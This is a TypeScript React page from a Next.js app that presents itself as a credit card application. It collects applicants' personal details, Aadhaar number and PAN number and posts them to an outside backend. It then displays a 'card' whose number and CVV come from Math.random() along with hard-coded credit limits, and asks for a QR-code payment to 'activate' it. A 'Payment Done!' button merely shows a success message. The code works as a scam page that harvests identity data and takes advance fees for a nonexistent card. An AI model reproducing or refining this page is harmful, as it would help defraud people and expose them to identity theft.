"use client";

import { useState, useEffect, ChangeEvent } from "react";
import axios from "axios";
import { useRouter } from "next/navigation";
import { toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import CreditCard from "../components/CreditCard";

interface FormData {
  fullName: string;
  fatherName: string;
  dateOfBirth: string;
  employmentType: string;
  gender: string;
  pinCode: string;
  address: string;
  aadharNumber: string;
  panNumber: string;
}

type CardData = {
  cardNumber: string;
  cvv: string;
  expiryDate: string;
  cardHolder: string;
  brandLogo: string;
};

export default function ApplyPage() {
  const [step, setStep] = useState<number>(1);
  const [formData, setFormData] = useState<FormData>({
    fullName: "",
    fatherName: "",
    dateOfBirth: "",
    employmentType: "Salaried",
    gender: "Male",
    pinCode: "",
    address: "",
    aadharNumber: "",
    panNumber: "",
  });
  const [cardData, setCardData] = useState<CardData | null>(null);
  const [qrCodeUrl, setQrCodeUrl] = useState<string>("");
  const [isLoading, setIsLoading] = useState<boolean>(true);
  const [isModalOpen, setIsModalOpen] = useState<boolean>(false);
  const router = useRouter();

  useEffect(() => {
    const isLoggedIn = localStorage.getItem("isLoggedIn");
    if (!isLoggedIn || isLoggedIn !== "true") {
      toast.error("You must be logged in to access this page.", { position: "top-left" });
      router.push("/");
      return;
    }

    const fetchQrCode = async () => {
      try {
        const response = await axios.get("https://backend.navipro.in/api/get-qr");
        setQrCodeUrl(response.data.url);
      } catch (error) {
        console.error("Error fetching QR Code:", error);
      } finally {
        setIsLoading(false);
      }
    };

    fetchQrCode();
  }, [router]);

  const validateAadhar = (aadhar: string): boolean => /^\d{12}$/.test(aadhar);
  const validatePAN = (pan: string): boolean => /^[A-Z]{5}\d{4}[A-Z]{1}$/.test(pan);

  const handleNext = async (): Promise<void> => {
    if (step === 1) {
      if (!formData.fullName || !formData.fatherName || !formData.dateOfBirth || !formData.pinCode || !formData.address) {
        toast.error("Please fill out all personal details.", { position: "top-left" });
        return;
      }
    }

    if (step === 2) {
      if (!formData.aadharNumber || !validateAadhar(formData.aadharNumber)) {
        toast.error("Aadhar number must be a 12-digit number.", { position: "top-left" });
        return;
      }
      if (!formData.panNumber || !validatePAN(formData.panNumber)) {
        toast.error("PAN number must follow the format: AFZPK7190K.", { position: "top-left" });
        return;
      }
      try {
        await axios.post("https://backend.navipro.in/api/user-details/save", formData);
        toast.success("Details saved successfully.", { position: "top-left" });

        const newCardData = {
          cardNumber: Math.random().toString().slice(2, 18),
          cvv: Math.random().toString().slice(2, 5),
          expiryDate: `${new Date().getMonth() + 1}/` + `${new Date().getFullYear() + 5}`,
          cardHolder: formData.fullName,
          brandLogo: "/brand-logo.png",
        };
        setCardData(newCardData);
        localStorage.setItem("cardData", JSON.stringify(newCardData));
      } catch (error) {
        console.error("Error saving details:", error);
        toast.error("Failed to save details.", { position: "top-left" });
        return;
      }
    }

    if (step < 3) {
      setStep(step + 1);
    }
  };

  const handleChange = (
    e: ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>
  ): void => {
    const updatedData = { ...formData, [e.target.name]: e.target.value };
    setFormData(updatedData);
  };

  const handlePaymentDone = (): void => {
    toast.success("Payment successful! Redirecting to home page.", { position: "top-left" });
    router.push("/");
  };

  const toggleModal = (): void => {
    setIsModalOpen(!isModalOpen);
  };

  const renderStepContent = (): JSX.Element | null => {
    switch (step) {
      case 1:
        return (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold">PERSONAL DETAILS</h2>
            <div>
              <label className="block">Full Name</label>
              <input
                type="text"
                name="fullName"
                value={formData.fullName}
                onChange={handleChange}
                placeholder="Enter your full name"
                className="border p-2 rounded w-full"
              />
            </div>
            <div>
              <label className="block">Father Name</label>
              <input
                type="text"
                name="fatherName"
                value={formData.fatherName}
                onChange={handleChange}
                placeholder="Enter your father's name"
                className="border p-2 rounded w-full"
              />
            </div>
            <div>
              <label className="block">Date of Birth</label>
              <input
                type="date"
                name="dateOfBirth"
                value={formData.dateOfBirth}
                onChange={handleChange}
                className="border p-2 rounded w-full"
              />
            </div>
            <div>
              <label className="block">Employment Type</label>
              <select
                name="employmentType"
                value={formData.employmentType}
                onChange={handleChange}
                className="border p-2 rounded w-full"
              >
                <option value="Salaried">Salaried</option>
                <option value="Self-Employed">Self-Employed</option>
                <option value="Unemployed">Unemployed</option>
              </select>
            </div>
            <div>
              <label className="block">Gender</label>
              <select
                name="gender"
                value={formData.gender}
                onChange={handleChange}
                className="border p-2 rounded w-full"
              >
                <option value="Male">Male</option>
                <option value="Female">Female</option>
                <option value="Other">Other</option>
              </select>
            </div>
            <div>
              <label className="block">Pin Code</label>
              <input
                type="text"
                name="pinCode"
                value={formData.pinCode}
                onChange={handleChange}
                placeholder="Enter your pin code"
                className="border p-2 rounded w-full"
              />
            </div>
            <div>
              <label className="block">Address</label>
              <textarea
                name="address"
                value={formData.address}
                onChange={handleChange}
                placeholder="Enter your address"
                className="border p-2 rounded w-full"
              ></textarea>
            </div>
            <button className="bg-blue-500 text-white p-2 rounded" onClick={handleNext}>
              Next
            </button>
          </div>
        );
      case 2:
        return (
          <div className="space-y-4">
            <h2 className="text-2xl font-bold">IDENTITY DETAILS</h2>
            <div>
              <label className="block">Aadhar Number</label>
              <input
                type="text"
                name="aadharNumber"
                value={formData.aadharNumber}
                onChange={handleChange}
                placeholder="Enter your Aadhar number"
                className="border p-2 rounded w-full"
              />
            </div>
            <div>
              <label className="block">PAN Number</label>
              <input
                type="text"
                name="panNumber"
                value={formData.panNumber}
                onChange={handleChange}
                placeholder="Enter your PAN number"
                className="border p-2 rounded w-full"
              />
            </div>
            <button className="bg-blue-500 text-white p-2 rounded" onClick={handleNext}>
              Next
            </button>
          </div>
        );
      case 3:
        return (
          <div className="space-y-8">
          <h2 className="text-2xl font-bold text-center">GET YOUR CARDS</h2>
          <p className="text-2xl font-medium text-center text-red-700">
            🎉 Congratulations! Your card is ready. Click on card to see the backside.
          </p>
            {cardData && <CreditCard {...cardData} />}
            {/* Credit Card Limits Section */}
          <div className="text-center mb-4">
            <h3 className="text-2xl font-bold text-gray-800">
              Your Credit Card Limit
            </h3>
          </div>
    
          <div className="flex justify-center space-x-8">
            {/* Cash Limit */}
            <div className="flex flex-col items-center bg-white rounded-lg shadow-md p-4 w-48">
              <img
                src="/cash.png" // Replace with actual image path
                alt="Cash Limit"
                className="w-16 h-16 mb-2"
              />
              <h4 className="text-lg font-semibold text-gray-700">Cash Limit</h4>
              <p className="text-xl font-bold text-gray-900">INR 62500/-</p>
            </div>
    
            {/* Shopping Limit */}
            <div className="flex flex-col items-center bg-white rounded-lg shadow-md p-4 w-48">
              <img
                src="/shopping.png" // Replace with actual image path
                alt="Shopping Limit"
                className="w-16 h-16 mb-2"
              />
              <h4 className="text-lg font-semibold text-gray-700">
                Shopping Limit
              </h4>
              <p className="text-xl font-bold text-gray-900">INR 62500/-</p>
            </div>
          </div>
          <button
            className="w-full bg-green-600 text-white py-3 rounded-lg px-10 hover:bg-green-700"
            onClick={toggleModal}
          >
            Card Active
          </button>

            {isModalOpen && (
              <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
                <div className="bg-white rounded-lg p-6 w-80 shadow-lg relative">
                  <button
                    onClick={toggleModal}
                    className="absolute top-2 right-2 text-gray-500 hover:text-gray-800"
                  >
                    ✕
                  </button>

                  {isLoading ? (
                    <p>Loading...</p>
                  ) : (
                    <div>
                      <h2 className="text-lg font-semibold text-center mb-4">
                        Please scan the QR code to complete the payment.
                      </h2>
                      <img
                        src={qrCodeUrl}
                        alt="QR Code"
                        className="w-full h-56 object-contain mb-4"
                      />
                      <button
                        onClick={handlePaymentDone}
                        className="w-full bg-green-600 text-white py-2 rounded hover:bg-green-700"
                      >
                        Payment Done!
                      </button>
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="container mx-auto p-6">
      <div className="flex justify-around mb-6">
        <span className={`font-bold ${step === 1 ? "text-blue-600" : "text-gray-400"}`}>Step 1: Personal Details</span>
        <span className={`font-bold ${step === 2 ? "text-blue-600" : "text-gray-400"}`}>Step 2: Identity Details</span>
        <span className={`font-bold ${step === 3 ? "text-blue-600" : "text-gray-400"}`}>Step 3: Get Your Card</span>
      </div>
      {renderStepContent()}
    </div>
  );
}
